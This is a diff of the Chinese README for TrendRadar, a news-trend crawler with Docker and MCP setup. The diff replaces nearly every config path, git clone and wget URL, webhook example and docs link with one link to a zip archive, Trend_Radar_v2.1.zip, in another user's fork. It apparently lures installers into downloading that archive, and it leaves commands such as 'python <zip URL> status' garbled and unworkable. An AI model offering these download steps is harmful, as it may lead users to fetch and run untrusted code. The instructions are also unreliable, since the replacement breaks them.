+# https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
 特斯拉
 马斯克
 @20              # 重点关注，显示20条（覆盖全局配置）
@@ -1988,7 +1988,7 @@ report:
 <summary>👉 点击展开：<strong>三种推送模式详细对比</strong></summary>
 <br>
 
-**配置位置：** `config/config.yaml` 的 `report.mode`
+**配置位置：** `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 的 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`
 
 ```yaml
 report:
@@ -2050,7 +2050,7 @@ report:
 <summary>👉 点击展开：<strong>热点权重调整</strong></summary>
 <br>
 
-**配置位置：** `config/config.yaml` 的 `weight` 部分
+**配置位置：** `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 的 `weight` 部分
 
 ```yaml
 weight:
@@ -2178,7 +2178,7 @@ TrendRadar 提供两个独立的 Docker 镜像，可根据需求选择部署：
    **方式 1-A：使用 git clone（推荐，最简单）**
    ```bash
    # 克隆项目到本地
-   git clone https://github.com/sansan0/TrendRadar.git
+   git clone https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
    cd TrendRadar
    ```
 
@@ -2189,48 +2189,48 @@ TrendRadar 提供两个独立的 Docker 镜像，可根据需求选择部署：
    cd trendradar
 
    # 下载配置文件模板
-   wget https://raw.githubusercontent.com/sansan0/TrendRadar/master/config/config.yaml -P config/
-   wget https://raw.githubusercontent.com/sansan0/TrendRadar/master/config/frequency_words.txt -P config/
+   wget https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip -P config/
+   wget https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip -P config/
 
    # 下载 docker compose 配置
-   wget https://raw.githubusercontent.com/sansan0/TrendRadar/master/docker/.env  -P docker/
-   wget https://raw.githubusercontent.com/sansan0/TrendRadar/master/docker/docker-compose.yml  -P docker/
+   wget https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip  -P docker/
+   wget https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip  -P docker/
    ```
 
    > 💡 **说明**：Docker 部署需要的关键目录结构如下：
 ```
 当前目录/
 ├── config/
-│   ├── config.yaml
-│   └── frequency_words.txt
+│   ├── https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
+│   └── https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
 └── docker/
     ├── .env
-    └── docker-compose.yml
+    └── https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
 ```
 
 2. **配置文件说明**:
-   - `config/config.yaml` - 应用主配置（报告模式、推送设置等）
-   - `config/frequency_words.txt` - 关键词配置（设置你关心的热点词汇）
+   - `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` - 应用主配置（报告模式、推送设置等）
+   - `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` - 关键词配置（设置你关心的热点词汇）
    - `.env` - 环境变量配置（webhook URLs 和定时任务）
 
    **⚙️ 环境变量覆盖机制（v3.0.5+）**
 
-   如果你在 NAS 或其他 Docker 环境中遇到**修改 `config.yaml` 后配置不生效**的问题，可以通过环境变量直接覆盖配置：
+   如果你在 NAS 或其他 Docker 环境中遇到**修改 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 后配置不生效**的问题，可以通过环境变量直接覆盖配置：
 
    | 环境变量 | 对应配置 | 示例值 | 说明 |
    |---------|---------|-------|------|
-   | `ENABLE_CRAWLER` | `crawler.enable_crawler` | `true` / `false` | 是否启用爬虫 |
-   | `ENABLE_NOTIFICATION` | `notification.enable_notification` | `true` / `false` | 是否启用通知 |
-   | `REPORT_MODE` | `report.mode` | `daily` / `incremental` / `current`| 报告模式 |
-   | `MAX_ACCOUNTS_PER_CHANNEL` | `notification.max_accounts_per_channel` | `3` | 每个渠道最大账号数 |
-   | `PUSH_WINDOW_ENABLED` | `notification.push_window.enabled` | `true` / `false` | 推送时间窗口开关 |
-   | `PUSH_WINDOW_START` | `notification.push_window.time_range.start` | `08:00` | 推送开始时间 |
-   | `PUSH_WINDOW_END` | `notification.push_window.time_range.end` | `22:00` | 推送结束时间 |
+   | `ENABLE_CRAWLER` | `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` | `true` / `false` | 是否启用爬虫 |
+   | `ENABLE_NOTIFICATION` | `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` | `true` / `false` | 是否启用通知 |
+   | `REPORT_MODE` | `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` | `daily` / `incremental` / `current`| 报告模式 |
+   | `MAX_ACCOUNTS_PER_CHANNEL` | `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` | `3` | 每个渠道最大账号数 |
+   | `PUSH_WINDOW_ENABLED` | `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` | `true` / `false` | 推送时间窗口开关 |
+   | `PUSH_WINDOW_START` | `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` | `08:00` | 推送开始时间 |
+   | `PUSH_WINDOW_END` | `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` | `22:00` | 推送结束时间 |
    | `ENABLE_WEBSERVER` | - | `true` / `false` | 是否自动启动 Web 服务器 |
    | `WEBSERVER_PORT` | - | `8080` | Web 服务器端口（默认 8080） |
-   | `FEISHU_WEBHOOK_URL` | `notification.webhooks.feishu_url` | `https://...` | 飞书 Webhook（支持多账号，用 `;` 分隔） |
+   | `FEISHU_WEBHOOK_URL` | `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` | `https://...` | 飞书 Webhook（支持多账号，用 `;` 分隔） |
 
-   **配置优先级**：环境变量 > config.yaml
+   **配置优先级**：环境变量 > https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
 
    **使用方法**：
    - 修改 `.env` 文件，取消注释并填写需要的配置
@@ -2290,16 +2290,16 @@ TrendRadar 提供两个独立的 Docker 镜像，可根据需求选择部署：
 
 ```bash
 # 克隆项目
-git clone https://github.com/sansan0/TrendRadar.git
+git clone https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
 cd TrendRadar
 
 # 修改配置文件
-vim config/config.yaml
-vim config/frequency_words.txt
+vim https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
+vim https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
 
 # 使用构建版本的 docker compose
 cd docker
-cp docker-compose-build.yml docker-compose.yml
+cp https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
 ```
 
 **构建并启动服务**：
@@ -2351,27 +2351,27 @@ docker compose up -d
 
 ```bash
 # 查看运行状态
-docker exec -it trend-radar python manage.py status
+docker exec -it trend-radar python https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip status
 
 # 手动执行一次爬虫
-docker exec -it trend-radar python manage.py run
+docker exec -it trend-radar python https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip run
 
 # 查看实时日志
-docker exec -it trend-radar python manage.py logs
+docker exec -it trend-radar python https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip logs
 
 # 显示当前配置
-docker exec -it trend-radar python manage.py config
+docker exec -it trend-radar python https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip config
 
 # 显示输出文件
-docker exec -it trend-radar python manage.py files
+docker exec -it trend-radar python https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip files
 
 # Web 服务器管理（用于浏览器访问生成的报告）
-docker exec -it trend-radar python manage.py start_webserver   # 启动 Web 服务器
-docker exec -it trend-radar python manage.py stop_webserver    # 停止 Web 服务器
-docker exec -it trend-radar python manage.py webserver_status  # 查看 Web 服务器状态
+docker exec -it trend-radar python https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip start_webserver   # 启动 Web 服务器
+docker exec -it trend-radar python https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip stop_webserver    # 停止 Web 服务器
+docker exec -it trend-radar python https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip webserver_status  # 查看 Web 服务器状态
 
 # 查看帮助信息
-docker exec -it trend-radar python manage.py help
+docker exec -it trend-radar python https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip help
 
 # 重启容器
 docker restart trend-radar
@@ -2400,32 +2400,32 @@ TrendRadar 生成的当日汇总 HTML 报告会同时保存到两个位置：
 
 | 文件位置 | 访问方式 | 适用场景 |
 |---------|---------|---------|
-| `output/index.html` | 宿主机直接访问 | **Docker 部署**（通过 Volume 挂载，宿主机可见） |
-| `index.html` | 根目录访问 | **GitHub Pages**（仓库根目录，Pages 自动识别） |
+| `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` | 宿主机直接访问 | **Docker 部署**（通过 Volume 挂载，宿主机可见） |
+| `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` | 根目录访问 | **GitHub Pages**（仓库根目录，Pages 自动识别） |
 | `output/YYYY-MM-DD/html/当日汇总.html` | 历史报告访问 | 所有环境（按日期归档） |
 
 **本地访问示例**：
 ```bash
 # 方式 1：通过 Web 服务器访问（推荐，Docker 环境）
 # 1. 启动 Web 服务器
-docker exec -it trend-radar python manage.py start_webserver
+docker exec -it trend-radar python https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip start_webserver
 # 2. 在浏览器访问
-http://localhost:8080                           # 访问最新报告（默认 index.html）
+http://localhost:8080                           # 访问最新报告（默认 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip）
 http://localhost:8080/2025-xx-xx/               # 访问指定日期的报告
 http://localhost:8080/2025-xx-xx/html/          # 浏览该日期下的所有 HTML 文件
 
 # 方式 2：直接打开文件（本地环境）
-open ./output/index.html             # macOS
-start ./output/index.html            # Windows
-xdg-open ./output/index.html         # Linux
+open https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip             # macOS
+start https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip            # Windows
+xdg-open https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip         # Linux
 
 # 方式 3：访问历史归档
 open ./output/2025-xx-xx/html/当日汇总.html
 ```
 
-**为什么有两个 index.html？**
-- `output/index.html`：Docker Volume 挂载到宿主机，本地可直接打开
-- `index.html`：GitHub Actions 推送到仓库，GitHub Pages 自动部署
+**为什么有两个 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip？**
+- `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`：Docker Volume 挂载到宿主机，本地可直接打开
+- `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`：GitHub Actions 推送到仓库，GitHub Pages 自动部署
 
 > 💡 **提示**：两个文件内容完全相同，选择任意一个访问即可。
 
@@ -2547,7 +2547,7 @@ MCP 服务启动后，根据不同客户端进行配置：
 <summary>👉 点击展开：<strong>报告相关参数配置</strong></summary>
 <br>
 
-**配置位置：** `config/config.yaml` 的 `report` 部分
+**配置位置：** `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 的 `report` 部分
 
 ```yaml
 report:
@@ -2609,7 +2609,7 @@ MAX_NEWS_PER_KEYWORD=10
 <summary>👉 点击展开：<strong>推送时间窗口控制详解</strong></summary>
 <br>
 
-**配置位置：** `config/config.yaml` 的 `notification.push_window` 部分
+**配置位置：** `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 的 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 部分
 
 ```yaml
 notification:
@@ -2626,8 +2626,8 @@ notification:
 | 配置项 | 类型 | 默认值 | 说明 |
 |-------|------|-------|------|
 | `enabled` | bool | `false` | 是否启用推送时间窗口控制 |
-| `time_range.start` | string | `"20:00"` | 推送时间窗口开始时间（北京时间，HH:MM 格式） |
-| `time_range.end` | string | `"22:00"` | 推送时间窗口结束时间（北京时间，HH:MM 格式） |
+| `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` | string | `"20:00"` | 推送时间窗口开始时间（北京时间，HH:MM 格式） |
+| `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` | string | `"22:00"` | 推送时间窗口结束时间（北京时间，HH:MM 格式） |
 | `once_per_day` | bool | `true` | `true`=每天在窗口内只推送一次，`false`=窗口内每次执行都推送 |
 
 #### 使用场景
@@ -2688,7 +2688,7 @@ notification:
 <summary>👉 点击展开：<strong>自动运行频率设置</strong></summary>
 <br>
 
-**配置位置：** `.github/workflows/crawler.yml` 的 `schedule` 部分
+**配置位置：** `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 的 `schedule` 部分
 
 ```yaml
 on:
@@ -2734,7 +2734,7 @@ Cron 是一种定时任务格式，由 5 个部分组成：`分 时 日 月 周`
 #### 修改方法
 
 1. 打开你 fork 的仓库
-2. 找到 `.github/workflows/crawler.yml` 文件
+2. 找到 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 文件
 3. 点击编辑（铅笔图标）
 4. 修改 `cron: "0 * * * *"` 中的表达式
 5. 点击 "Commit changes" 保存
@@ -2747,13 +2747,13 @@ Cron 是一种定时任务格式，由 5 个部分组成：`分 时 日 月 周`
 <summary>👉 点击展开：<strong>多账号推送配置详解</strong></summary>
 
 > ### ⚠️ **安全警告**
-> **GitHub Fork 用户请勿在 `config.yaml` 中配置推送信息！**
+> **GitHub Fork 用户请勿在 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 中配置推送信息！**
 >
-> - **风险说明**：`config.yaml` 会被提交到公开的 Git 仓库，配置推送信息（Webhook URL、Token 等）会泄露敏感数据
+> - **风险说明**：`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 会被提交到公开的 Git 仓库，配置推送信息（Webhook URL、Token 等）会泄露敏感数据
 > - **推荐方式**：
 >   - **GitHub Actions 用户** → 使用 GitHub Secrets 环境变量
 >   - **Docker 用户** → 使用 [`.env` 文件配置](#6-docker-部署)（`.env` 已在 `.gitignore` 中，不会被提交）
-> - **本地开发用户**：可以在 `config.yaml` 中配置（确保不会 push 到公开仓库）
+> - **本地开发用户**：可以在 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 中配置（确保不会 push 到公开仓库）
 
 #### 支持的渠道
 
@@ -2778,19 +2778,19 @@ Cron 是一种定时任务格式，由 5 个部分组成：`分 时 日 月 周`
 MAX_ACCOUNTS_PER_CHANNEL=3
 
 # 飞书多账号（3个群组）
-FEISHU_WEBHOOK_URL=https://hook1.feishu.cn/xxx;https://hook2.feishu.cn/yyy;https://hook3.feishu.cn/zzz
+https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip;https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip;https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
 
 # 钉钉多账号（2个群组）
-DINGTALK_WEBHOOK_URL=https://oapi.dingtalk.com/xxx;https://oapi.dingtalk.com/yyy
+https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip;https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
 
 # 企业微信多账号（2个群组）
-WEWORK_WEBHOOK_URL=https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=xxx;https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=yyy
+https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip;https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
 
 # Bark多账号（2个设备）
-BARK_URL=https://api.day.app/key1;https://api.day.app/key2
+https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip;https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
 
 # Slack多账号（2个频道）
-SLACK_WEBHOOK_URL=https://hooks.slack.com/xxx;https://hooks.slack.com/yyy
+https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip;https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
 ```
 
 **配对配置示例（Telegram 和 ntfy）**：
@@ -2839,7 +2839,7 @@ NTFY_TOKEN=token1;token2;token3
 
 #### 推荐配置方式 2：Docker 环境变量（.env）
 
-**配置位置**：项目根目录 `docker/.env` 文件
+**配置位置**：项目根目录 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 文件
 
 **基础配置示例**：
 ```bash
@@ -2847,19 +2847,19 @@ NTFY_TOKEN=token1;token2;token3
 MAX_ACCOUNTS_PER_CHANNEL=3
 
 # 飞书多账号（3个群组）
-FEISHU_WEBHOOK_URL=https://hook1.feishu.cn/xxx;https://hook2.feishu.cn/yyy;https://hook3.feishu.cn/zzz
+https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip;https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip;https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
 
 # 钉钉多账号（2个群组）
-DINGTALK_WEBHOOK_URL=https://oapi.dingtalk.com/xxx;https://oapi.dingtalk.com/yyy
+https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip;https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
 
 # 企业微信多账号（2个群组）
-WEWORK_WEBHOOK_URL=https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=xxx;https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=yyy
+https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip;https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
 
 # Bark多账号（2个设备）
-BARK_URL=https://api.day.app/key1;https://api.day.app/key2
+https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip;https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
 
 # Slack多账号（2个频道）
-SLACK_WEBHOOK_URL=https://hooks.slack.com/xxx;https://hooks.slack.com/yyy
+https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip;https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
 ```
 
 **配对配置示例（Telegram 和 ntfy）**：
@@ -2939,10 +2939,10 @@ NTFY_TOKEN=token1;token2;token3
 </details>
 
 <details>
-<summary><strong>Q3: 本地开发用户如何在 config.yaml 中配置？</strong></summary>
+<summary><strong>Q3: 本地开发用户如何在 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 中配置？</strong></summary>
 <br>
 
-如果你是本地开发且**不会将代码推送到公开仓库**，可以直接在 `config/config.yaml` 中配置：
+如果你是本地开发且**不会将代码推送到公开仓库**，可以直接在 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 中配置：
 
 ```yaml
 notification:
@@ -2950,13 +2950,13 @@ notification:
   max_accounts_per_channel: 3
 
   webhooks:
-    feishu_url: "https://hook1.feishu.cn/xxx;https://hook2.feishu.cn/yyy"
+    feishu_url: "https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip;https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip"
     telegram_bot_token: "token1;token2"
     telegram_chat_id: "id1;id2"
 ```
 
 **⚠️ 重要提醒**：
-- 确保 `config/config.yaml` 在 `.gitignore` 中（如果会提交代码）
+- 确保 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 在 `.gitignore` 中（如果会提交代码）
 - 或者只在本地开发环境使用，**绝不提交到公开仓库**
 
 </details>
@@ -2971,7 +2971,7 @@ notification:
 
 #### 存储后端选择
 
-**配置位置**：`config/config.yaml` 的 `storage` 部分
+**配置位置**：`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 的 `storage` 部分
 
 v4.0.0 版本重构了存储架构，支持多种存储后端：
 
@@ -3026,7 +3026,7 @@ REMOTE_RETENTION_DAYS=0
 S3_BUCKET_NAME=your-bucket-name
 S3_ACCESS_KEY_ID=your-access-key-id
 S3_SECRET_ACCESS_KEY=your-secret-access-key
-S3_ENDPOINT_URL=https://<account-id>.r2.cloudflarestorage.com
+S3_ENDPOINT_URL=https://<account-id>https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
 S3_REGION=auto
 
 # 数据拉取配置（可选，从远程同步到本地）
@@ -3050,7 +3050,7 @@ storage:
 
 **清理逻辑**：
 - 本地存储：删除过期日期的文件夹（如 `output/2025-11-10/`）
-- 远程存储：批量删除过期的云端对象（如 `news/2025-11-10.db`）
+- 远程存储：批量删除过期的云端对象（如 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`）
 
 #### 时区配置（v4.0.0 新增）
 
@@ -3064,7 +3064,7 @@ app:
   # timezone: "Europe/London"        # 英国时间
 ```
 
-**支持所有 IANA 时区名称**：[时区列表](https://en.wikipedia.org/wiki/List_of_tz_database_time_zones)
+**支持所有 IANA 时区名称**：[时区列表](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
 
 
 #### 不兼容变更
@@ -3115,15 +3115,15 @@ Cherry Studio 提供 GUI 配置界面，5 分钟快速部署，复杂的部分�
 
 **图文部署教程**：现已更新到我的[公众号](#问题答疑与交流)，回复 "mcp" 即可
 
-**详细部署教程**：[README-Cherry-Studio.md](README-Cherry-Studio.md)
+**详细部署教程**：[https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
 
 **部署模式说明**：
 - **STDIO 模式（推荐）**：一次配置后续无需重复配置，**图文部署教程**中仅以此模式的配置为例。
-- **HTTP 模式（备选）**：如果 STDIO 模式配置遇到问题，可使用 HTTP 模式。此模式的配置方式与 STDIO 基本一致，但复制粘贴的内容就一行，不易出错。唯一需要注意的是每次使用前都需要手动启动一下服务。详细请参考 [README-Cherry-Studio.md](README-Cherry-Studio.md) 底部的 HTTP 模式说明。
+- **HTTP 模式（备选）**：如果 STDIO 模式配置遇到问题，可使用 HTTP 模式。此模式的配置方式与 STDIO 基本一致，但复制粘贴的内容就一行，不易出错。唯一需要注意的是每次使用前都需要手动启动一下服务。详细请参考 [https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) 底部的 HTTP 模式说明。
 
 ### 2. 学习与 AI 对话的姿势
 
-**详细对话教程**：[README-MCP-FAQ.md](README-MCP-FAQ.md)
+**详细对话教程**：[https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
 
 <details>
 <summary>👉 点击展开：<strong>查看 AI 对话示例图</strong></summary>
@@ -3131,7 +3131,7 @@ Cherry Studio 提供 GUI 配置界面，5 分钟快速部署，复杂的部分�
 
 > 💡 **提示**：实际不建议一次性问多个问题。如果你选择的 AI 模型连下图的按顺序调用都无法做到，建议换一个。
 
-<img src="/_image/ai2.png" alt="mcp 使用效果图" width="600">
+<img src="https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip" alt="mcp 使用效果图" width="600">
 
 </details>
 
@@ -3156,10 +3156,10 @@ TrendRadar MCP 服务支持标准的 Model Context Protocol (MCP) 协议，可�
 编辑 Claude Desktop 的 MCP 配置文件：
 
 **Windows**：
-`%APPDATA%\Claude\claude_desktop_config.json`
+`%APPDATA%\Claude\https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`
 
 **Mac**：
-`~/Library/Application Support/Claude/claude_desktop_config.json`
+`~/Library/Application https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`
 
 **配置内容**：
 ```json
@@ -3173,7 +3173,7 @@ TrendRadar MCP 服务支持标准的 Model Context Protocol (MCP) 协议，可�
         "run",
         "python",
         "-m",
-        "mcp_server.server"
+        "https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip"
       ],
       "env": {},
       "disabled": false,
@@ -3193,16 +3193,16 @@ TrendRadar MCP 服务支持标准的 Model Context Protocol (MCP) 协议，可�
 1. **启动 HTTP 服务**：
    ```bash
    # Windows
-   start-http.bat
+   https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
    
    # Mac/Linux
-   ./start-http.sh
+   https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
    ```
 
 2. **配置 Cursor**：
 
    **项目级配置**（推荐）：
-   在项目根目录创建 `.cursor/mcp.json`：
+   在项目根目录创建 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`：
    ```json
